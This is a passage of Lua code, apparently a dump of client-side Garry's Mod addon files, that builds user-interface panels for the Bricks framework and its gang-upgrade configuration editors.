	self:MakePopup()
	self:SetPos( x, y )
end

function PANEL:Think()
	if( not self:HasFocus() ) then
		if( not self.removeTime ) then
			self.removeTime = CurTime()+0.1
		end
	elseif( self.removeTime ) then
		self.removeTime = nil
	end

	if( not IsValid( self.parent ) or not self.parent:IsVisible() or (self.removeTime and CurTime() >= self.removeTime) ) then
		self:Remove()
	end
end

function PANEL:Paint( w, h )
	local x, y = self:LocalToScreen( 0, 0 )

	BRICKS_SERVER.BSHADOWS.BeginShadow()
	draw.RoundedBox( 8, x, y, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )	
	BRICKS_SERVER.BSHADOWS.EndShadow(2, 2, 1, 255, 0, 0, false )
end

vgui.Register( "bricks_server_popupdmenu", PANEL, "DPanel" )
--PATH addons/____bricks_framework/lua/bricks_server/vgui/bricks_server_raritybox.lua:
local PANEL = {}

function PANEL:Init()

end

function PANEL:SetRarityName( rarityName, direction, rarityInfo )
	self:Clear()

	self.rarityInfo = rarityInfo or BRICKS_SERVER.Func.GetRarityInfo( rarityName )

	if( not self.rarityInfo ) then return end

	self.rarityType = self.rarityInfo[2]

	if( (self.rarityType == "Gradient" or self.rarityType == "Fade") and (not self.rarityInfo[3] or #self.rarityInfo[3] <= 1) ) then
		self.rarityType = "SolidColor"
	end

	if( self.rarityType == "Gradient" or self.rarityType == "Rainbow" ) then
		self.colorPanel = vgui.Create( "bricks_server_gradientanim", self )
		self.colorPanel:SetPos( 0, 0 )
		self.colorPanel:SetSize( self:GetSize() )

		if( direction ) then
			self.colorPanel:SetDirection( direction )
		end
		
		if( self.rarityType == "Rainbow" ) then
			self.colorPanel:TasteTheRainbow()
		else
			self.colorPanel:SetColors( unpack( self.rarityInfo[3] ) )
		end

		self.colorPanel:StartAnim()
	else
		local panelColors
		if( self.rarityType == "Fade" ) then
			panelColors = self.rarityInfo[3]
		else
			panelColors = { self.rarityInfo[3] }
		end

		local fadeTime = 3
		local changeTime, currentColor, nextColor = CurTime()+fadeTime, 1, 2

		self.colorPanel = vgui.Create( "DPanel", self )
		self.colorPanel:SetPos( 0, 0 )
		self.colorPanel:SetSize( self:GetSize() )
		self.colorPanel.Paint = function( self2, w, h )
			local panelColor = panelColors[1]
			if( self.rarityType == "Fade" ) then
				if( CurTime() >= changeTime ) then
					changeTime, currentColor, nextColor = CurTime()+fadeTime, nextColor, ((panelColors[nextColor+1] and nextColor+1) or 1)
				end

				local curColor, nextColor = panelColors[currentColor], panelColors[nextColor]
				local percent = (fadeTime-(changeTime-CurTime()))/fadeTime

				panelColor = Color( Lerp( percent, curColor.r, nextColor.r ), Lerp( percent, curColor.g, nextColor.g ), Lerp( percent, curColor.b, nextColor.b ) )
			end
			
			if( self.cornerRadius > 0 ) then
				draw.RoundedBox( self.cornerRadius, (self.roundedBoxX or 0), (self.roundedBoxY or 0), (self.roundedBoxW or w), (self.roundedBoxH or h), panelColor )
			else
				surface.SetDrawColor( panelColor )
				surface.DrawRect( (self.roundedBoxX or 0), (self.roundedBoxY or 0), (self.roundedBoxW or w), (self.roundedBoxH or h) )
			end
		end
	end
end

function PANEL:SetRarityInfo( rarityInfo, direction )
	self:SetRarityName( false, direction, rarityInfo )
end

function PANEL:OnSizeChanged( w, h )
	if( IsValid( self.colorPanel ) ) then
		self.colorPanel:SetSize( w, h )
	end
end

function PANEL:SetCornerRadius( cornerRadius )
	self.cornerRadius = cornerRadius

	if( self.rarityType != "Gradient" and self.rarityType != "Rainbow" ) then return end

    self.colorPanel:SetCornerRadius( cornerRadius )
end

function PANEL:SetRoundedBoxDimensions( roundedBoxX, roundedBoxY, roundedBoxW, roundedBoxH )
	self.roundedBoxX, self.roundedBoxY, self.roundedBoxW, self.roundedBoxH = roundedBoxX, roundedBoxY, roundedBoxW, roundedBoxH

	if( self.rarityType != "Gradient" and self.rarityType != "Rainbow" ) then return end

	self.colorPanel:SetRoundedBoxDimensions( roundedBoxX, roundedBoxY, roundedBoxW, roundedBoxH )
end

function PANEL:Paint( w, h )

end

vgui.Register( "bricks_server_raritybox", PANEL, "DPanel" )
--PATH addons/____bricks_gangs/lua/bricks_server/modules/gangs/client/cl_gang_configpopups.lua:
function BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel, lastActionFunc )
	BRS_CONFIG_POPUP = vgui.Create( "DFrame" )
	BRS_CONFIG_POPUP:SetSize( ScrW(), ScrH() )
	BRS_CONFIG_POPUP:Center()
	BRS_CONFIG_POPUP:SetTitle( "" )
	BRS_CONFIG_POPUP:ShowCloseButton( false )
	BRS_CONFIG_POPUP:SetDraggable( false )
	BRS_CONFIG_POPUP:MakePopup()
	BRS_CONFIG_POPUP:SetAlpha( 0 )
	BRS_CONFIG_POPUP:AlphaTo( 255, 0.1, 0 )
	BRS_CONFIG_POPUP.Paint = function( self2 ) 
		BRICKS_SERVER.Func.DrawBlur( self2, 4, 4 )
	end

	local backgroundPanel = vgui.Create( "DPanel", BRS_CONFIG_POPUP )
	backgroundPanel.Paint = function( self2, w, h ) 
		local x, y = self2:LocalToScreen( 0, 0 )

		BRICKS_SERVER.BSHADOWS.BeginShadow()
		draw.RoundedBox( 5, x, y, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )			
		BRICKS_SERVER.BSHADOWS.EndShadow( 1, 2, 2, 255, 0, 0, false )
	end

	local backRightPanel = vgui.Create( "DPanel", backgroundPanel )
	backRightPanel:Dock( RIGHT )
	backRightPanel.Paint = function( self2, w, h ) 
		draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
	end

	local backLeftPanel = vgui.Create( "DPanel", backgroundPanel )
	backLeftPanel:Dock( LEFT )
	backLeftPanel.Paint = function( self2, w, h ) 
		if( self2.iconMat ) then
			surface.SetDrawColor( 255, 255, 255, 255 )
			surface.SetMaterial( self2.iconMat )
			local iconSize = 64
			surface.DrawTexturedRect( (w*0.5)-(iconSize*0.5), (h*0.5)-(iconSize*0.5), iconSize, iconSize )
		end
	end

	backgroundPanel.OnSizeChanged = function( self2, w, h )
		backRightPanel:SetWide( w*0.5 )
		backLeftPanel:SetWide( w*0.5 )
	end
	
	backgroundPanel:SetWide( 800 )
	backgroundPanel:Center()

	function backRightPanel.FillOptions( configTable, actions, extraActionsCount )
		backRightPanel:Clear()

		function backRightPanel.AddAction( v, k )
			local actionButton
			if( v[3] ) then
				actionButton = vgui.Create( "DButton", backRightPanel )
				actionButton:SetText( "" )
			else
				actionButton = vgui.Create( "DPanel", backRightPanel )
			end
			actionButton:Dock( TOP )
			local margin = (v[2] and 10) or 15
			actionButton:DockMargin( margin, 10, margin, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
				
				if( v[3] ) then
					if( self2:IsHovered() and not self2:IsDown() ) then
						changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
					else
						changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
					end

					surface.SetAlphaMultiplier( changeAlpha/255 )
						draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
					surface.SetAlphaMultiplier( 1 )

					BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				end

				if( v[2] ) then
					surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6 ) )
					surface.SetMaterial( v[2] )
					local iconSize = 24
					surface.DrawTexturedRect( (h-iconSize)*0.5, (h*0.5)-(iconSize*0.5), iconSize, iconSize )
				end

				if( v[4] and configTable[v[4]] and not v[5] ) then
					draw.SimpleText( v[1] .. " - " .. string.sub( configTable[v[4]], 1, 15 ) .. ((string.len( configTable[v[4]] ) > 15 and "...") or ""), "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( v[5] and isfunction( v[5] ) ) then
					draw.SimpleText( v[1] .. " - " .. v[5](), "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			if( v[3] ) then
				actionButton.DoClick = v[3]
			end

			if( (k or 0) == #actions and backRightPanel.lastActionFunc ) then
				local extraToAdd = backRightPanel.lastActionFunc( extraActionsCount )
				extraActionsCount = (extraActionsCount or 0)+(extraToAdd or 0)
			end
		end

		for k, v in ipairs( actions or {} ) do
			backRightPanel.AddAction( v, k )
		end

		local buttonPanel = vgui.Create( "DPanel", backRightPanel )
		buttonPanel:Dock( BOTTOM )
		buttonPanel:DockMargin( 10, 10, 10, 10 )
		buttonPanel:SetTall( 40 )
		buttonPanel.Paint = function( self2, w, h ) end

		local leftButton = vgui.Create( "DButton", buttonPanel )
		leftButton:Dock( LEFT )
		leftButton:SetText( "" )
		leftButton:DockMargin( 0, 0, 0, 0 )
		local changeAlpha = 0
		leftButton.Paint = function( self2, w, h )
			if( self2:IsHovered() and not self2:IsDown() ) then
				changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
			else
				changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
			end
			
			draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.Green )
	
			surface.SetAlphaMultiplier( changeAlpha/255 )
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen )
			surface.SetAlphaMultiplier( 1 )

			BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen )
	
			draw.SimpleText( BRICKS_SERVER.Func.L( "save" ), "BRICKS_SERVER_Font25", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end
		leftButton.DoClick = function()
			onSave( configTable )

			BRS_CONFIG_POPUP:AlphaTo( 0, 0.1, 0, function()
				if( IsValid( BRS_CONFIG_POPUP ) ) then
					BRS_CONFIG_POPUP:Remove()
				end
			end )
		end

		local rightButton = vgui.Create( "DButton", buttonPanel )
		rightButton:Dock( RIGHT )
		rightButton:SetText( "" )
		rightButton:DockMargin( 0, 0, 0, 0 )
		local changeAlpha = 0
		rightButton.Paint = function( self2, w, h )
			if( self2:IsHovered() and not self2:IsDown() ) then
				changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
			else
				changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
			end
			
			draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.Red )
	
			surface.SetAlphaMultiplier( changeAlpha/255 )
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed )
			surface.SetAlphaMultiplier( 1 )

			BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed )
	
			draw.SimpleText( BRICKS_SERVER.Func.L( "cancel" ), "BRICKS_SERVER_Font25", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end
		rightButton.DoClick = function()
			onCancel()

			BRS_CONFIG_POPUP:AlphaTo( 0, 0.1, 0, function()
				if( IsValid( BRS_CONFIG_POPUP ) ) then
					BRS_CONFIG_POPUP:Remove()
				end
			end )
		end

		backgroundPanel:SetTall( math.max( ScrH()*0.45, buttonPanel:GetTall()+(2*10)+((#actions+(extraActionsCount or 0))*50) ) )
		backgroundPanel:Center()

		leftButton:SetWide( (backRightPanel:GetWide()-30)*0.5 )
		rightButton:SetWide( (backRightPanel:GetWide()-30)*0.5 )
	end

	function backLeftPanel.Refresh()
		backLeftPanel:Clear()

		local topMargin, bottomMargin = backgroundPanel:GetTall()*0.075, 145

		local itemInfoDisplay = vgui.Create( "DPanel", backLeftPanel )
		itemInfoDisplay:SetSize( backLeftPanel:GetWide(), backgroundPanel:GetTall()-topMargin-bottomMargin )
		itemInfoDisplay:SetPos( backLeftPanel:GetWide()-itemInfoDisplay:GetWide(), topMargin )
		itemInfoDisplay.Paint = function( self2, w, h ) 
			draw.SimpleText( (backLeftPanel.Name or BRICKS_SERVER.Func.L( "nil" )), "BRICKS_SERVER_Font25", w*0.5, 5, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, 0 )
		end

		local itemInfoNoticeBack = vgui.Create( "DPanel", itemInfoDisplay )
		itemInfoNoticeBack:SetSize( 0, 35 )
		itemInfoNoticeBack:SetPos( (itemInfoDisplay:GetWide()*0.5)-(itemInfoNoticeBack:GetWide()*0.5), 5+28 )
		itemInfoNoticeBack.Paint = function( self2, w, h ) end

		for k, v in pairs( backLeftPanel.Notices or {} ) do
			surface.SetFont( "BRICKS_SERVER_Font20" )
			local textX, textY = surface.GetTextSize( v[1] )
			local boxW, boxH = textX+10, textY

			local itemInfoNotice = vgui.Create( "DPanel", itemInfoNoticeBack )
			itemInfoNotice:Dock( LEFT )
			itemInfoNotice:DockMargin( 0, 0, 5, 0 )
			itemInfoNotice:SetWide( boxW )
			itemInfoNotice.Paint = function( self2, w, h ) 
				draw.RoundedBox( 5, 0, 0, w, h, (v[2] or BRICKS_SERVER.Func.GetTheme( 5 )) )
				draw.SimpleText( v[1], "BRICKS_SERVER_Font20", w*0.5, (h*0.5)-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end

			if( itemInfoNoticeBack:GetWide() <= 5 ) then
				itemInfoNoticeBack:SetSize( itemInfoNoticeBack:GetWide()+boxW, boxH )
			else
				itemInfoNoticeBack:SetSize( itemInfoNoticeBack:GetWide()+5+boxW, boxH )
			end
			itemInfoNoticeBack:SetPos( (itemInfoDisplay:GetWide()*0.5)-(itemInfoNoticeBack:GetWide()*0.5), 5+28 )
		end
	end

	return backgroundPanel, backRightPanel, backLeftPanel
end

function BRICKS_SERVER.Func.CreateUpgradeEditor( oldUpgradeTable, upgradeKey, onSave, onCancel )
	local upgradeTable = table.Copy( oldUpgradeTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	backRightPanel.lastActionFunc = function()
		local reqInfoTable = upgradeTable.Default or {}
		if( (BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey] or {}).Unlimited ) then
			reqInfoTable = upgradeTable.ReqInfo or {}
		end

		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey].ReqInfo ) do
			local actionButton = vgui.Create( "DButton", backRightPanel )
			actionButton:SetText( "" )
			actionButton:Dock( TOP )
			actionButton:DockMargin( 15, 10, 15, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				if( self2:IsDown() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				elseif( self2:IsHovered() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				else
					changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
				end
				
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		
				surface.SetAlphaMultiplier( changeAlpha/255 )
					draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				surface.SetAlphaMultiplier( 1 )

				if( v[2] == "bool" ) then
					draw.SimpleText( v[1] .. " - " .. ((reqInfoTable[k] and "TRUE") or "FALSE"), "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( reqInfoTable[k] ) then
					draw.SimpleText( v[1] .. " - " .. reqInfoTable[k], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			actionButton.DoClick = function()
				if( v[2] == "string" or v[2] == "integer" ) then 
					BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", v[1] ), (reqInfoTable[k] or 0), function( text ) 
						reqInfoTable[k] = text
						backLeftPanel.RefreshInfo()
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (v[2] == "integer") )
				elseif( v[2] == "bool" ) then 
					reqInfoTable[k] = not reqInfoTable[k]
					backLeftPanel.RefreshInfo()
				elseif( v[2] == "table" and v[3] and BRICKS_SERVER.Func.GetList( v[3] ) ) then 
					BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), (reqInfoTable[k] or ""), BRICKS_SERVER.Func.GetList( v[3] ), function( value, data ) 
						if( BRICKS_SERVER.Func.GetList( v[3] )[data] ) then
							reqInfoTable[k] = data

							if( v[4] ) then
								local newupgradeTable = v[4]( upgradeTable ) 
								if( newupgradeTable ) then
									upgradeTable = newupgradeTable
								end
							end
							backLeftPanel.RefreshInfo()
						else
							notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
						end
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
				end
			end
		end
	end

	local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey]
	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey]
        
        if( upgradeTable.Icon ) then
            BRICKS_SERVER.Func.GetImage( upgradeTable.Icon, function( mat ) 
                backLeftPanel.iconMat = mat 
            end )
        end

		backLeftPanel.Name = upgradeTable.Name or BRICKS_SERVER.Func.L( "gangNewUpgrade" )

		backLeftPanel.Notices = {}

		if( devConfigTable.Unlimited ) then
			table.insert( backLeftPanel.Notices, { DarkRP.formatMoney( upgradeTable.Price ), BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen } )
		end

		if( upgradeTable.Level ) then
			table.insert( backLeftPanel.Notices, { BRICKS_SERVER.Func.L( "levelX", upgradeTable.Level ) } )
		end

		if( upgradeTable.Group ) then
			local groupTable
			for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
				if( v[1] == upgradeTable.Group ) then
					groupTable = v
				end
			end

			if( groupTable ) then
				table.insert( backLeftPanel.Notices, { (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), groupTable[3] } )
			end
		end

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), upgradeTable.Name, function( text ) 
				upgradeTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "description" ), Material( "materials/bricks_server/info.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newDescriptionQuery" ), upgradeTable.Description, function( text ) 
				upgradeTable.Description = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Description" },
		[3] = { BRICKS_SERVER.Func.L( "icon" ), Material( "materials/bricks_server/icon.png" ), function()
			BRICKS_SERVER.Func.MaterialRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newIconQuery" ), (upgradeTable.Icon or ""), function( icon ) 
				upgradeTable.Icon = icon
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end, "Icon" }
	}

    if( devConfigTable.Unlimited ) then
        table.insert( actions, { BRICKS_SERVER.Func.L( "group" ), Material( "materials/bricks_server/group.png" ), function()
			local options = {}
			options["None"] = BRICKS_SERVER.Func.L( "none" )
			for k, v in pairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups ) do
				options[k] = v[1]
			end
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "groupRequirementQuery" ), (upgradeTable.Group or ""), options, function( value, data ) 
				if( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups[data] ) then
					upgradeTable.Group = value
					backLeftPanel.RefreshInfo()
				elseif( data == "None" ) then
					upgradeTable.Group = nil
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidGroup" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end, "Group" } )
        
		table.insert( actions, { BRICKS_SERVER.Func.L( "level" ), Material( "materials/bricks_server/level.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "levelRequirementQuery" ), upgradeTable.Level, function( number ) 
				if( number > 0 ) then
					upgradeTable.Level = number
				else
					upgradeTable.Level = nil
				end
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "Level" } )

		table.insert( actions, { BRICKS_SERVER.Func.L( "price" ), Material( "materials/bricks_server/currency.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newPriceQuery" ), upgradeTable.Price, function( text ) 
				upgradeTable.Price = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "Price" } )
		
		table.insert( actions, { BRICKS_SERVER.Func.L( "type" ), Material( "materials/bricks_server/amount.png" ), function()
			local options = {}
			for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades ) do
				if( not v.Unlimited ) then continue end

				options[k] = v.Name
			end

			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newTypeQuery" ), (upgradeTable.Type or ""), options, function( value, data ) 
				if( options[data] ) then
					upgradeTable.Type = data
					backLeftPanel.RefreshInfo()
					backRightPanel.FillOptions( upgradeTable, actions )
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end, "Type" } )
	end
	
	backRightPanel.FillOptions( upgradeTable, actions )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateUpgradeTierEditor( oldTierTable, tierKey, upgradeTable, upgradeKey, onSave, onCancel )
	local tierTable = table.Copy( oldTierTable )
	
	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	local reqInfoIcon = Material( "bricks_server/more_24.png" )
	backRightPanel.lastActionFunc = function()
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeKey or ""].ReqInfo or {} ) do
			local actionButton = vgui.Create( "DButton", backRightPanel )
			actionButton:SetText( "" )
			actionButton:Dock( TOP )
			actionButton:DockMargin( 10, 10, 10, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				if( self2:IsDown() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				elseif( self2:IsHovered() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				else
					changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
				end
				
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		
				surface.SetAlphaMultiplier( changeAlpha/255 )
					draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				surface.SetAlphaMultiplier( 1 )

				surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6 ) )
				surface.SetMaterial( reqInfoIcon )
				local iconSize = 24
				surface.DrawTexturedRect( (h-iconSize)*0.5, (h*0.5)-(iconSize*0.5), iconSize, iconSize )

				if( v[2] == "bool" ) then
					draw.SimpleText( v[1] .. " - " .. (((tierTable.ReqInfo or {})[k] and BRICKS_SERVER.Func.L( "true" )) or BRICKS_SERVER.Func.L( "false" )), "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( (tierTable.ReqInfo or {})[k] ) then
					draw.SimpleText( v[1] .. " - " .. (tierTable.ReqInfo or {})[k], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			actionButton.DoClick = function()
				if( v[2] == "string" or v[2] == "integer" ) then 
					BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", v[1] ), ((tierTable.ReqInfo or {})[k] or 0), function( text ) 
						tierTable.ReqInfo = tierTable.ReqInfo or {}
						tierTable.ReqInfo[k] = text
						backLeftPanel.RefreshInfo()
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (v[2] == "integer") )
				elseif( v[2] == "bool" ) then 
					tierTable.ReqInfo = tierTable.ReqInfo or {}
					tierTable.ReqInfo[k] = not tierTable.ReqInfo[k]
					backLeftPanel.RefreshInfo()
				elseif( v[2] == "table" and v[3] and BRICKS_SERVER.Func.GetList( v[3] ) ) then 
					BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((tierTable.ReqInfo or {})[k] or ""), BRICKS_SERVER.Func.GetList( v[3] ), function( value, data ) 
						if( BRICKS_SERVER.Func.GetList( v[3] )[data] ) then
							tierTable.ReqInfo[k] = data

							if( v[4] ) then
								local newtierTable = v[4]( tierTable ) 
								if( newtierTable ) then
									tierTable = newtierTable
								end
							end
							backLeftPanel.RefreshInfo()
						else
							notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
						end
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
				end
			end
		end
	end

	if( upgradeTable.Icon ) then
		BRICKS_SERVER.Func.GetImage( upgradeTable.Icon, function( mat ) 
			backLeftPanel.iconMat = mat 
		end )
	end

	function backLeftPanel.RefreshInfo()
		backLeftPanel.Name = BRICKS_SERVER.Func.L( "gangUpgradeTierEdit", (upgradeTable.Name or BRICKS_SERVER.Func.L( "gangNewUpgrade" )), tierKey )

		backLeftPanel.Notices = {}

		table.insert( backLeftPanel.Notices, { DarkRP.formatMoney( tierTable.Price or 0 ), BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen } )

		if( tierTable.Level ) then
			table.insert( backLeftPanel.Notices, { BRICKS_SERVER.Func.L( "levelX", tierTable.Level ) } )
		end

		if( tierTable.Group ) then
			local groupTable
			for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
				if( v[1] == tierTable.Group ) then
					groupTable = v
				end
			end

			if( groupTable ) then
				table.insert( backLeftPanel.Notices, { (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), groupTable[3] } )
			end
		end

		backLeftPanel.Refresh()
    end
    
    local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeKey or ""]

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "price" ), Material( "materials/bricks_server/currency.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newPriceQuery" ), tierTable.Price, function( text ) 
				tierTable.Price = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "Price" },
		[2] = { BRICKS_SERVER.Func.L( "group" ), Material( "materials/bricks_server/group.png" ), function()
			local options = {}
			options["None"] = BRICKS_SERVER.Func.L( "none" )
			for k, v in pairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups ) do
				options[k] = v[1]
			end
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "groupRequirementQuery" ), (tierTable.Group or ""), options, function( value, data ) 
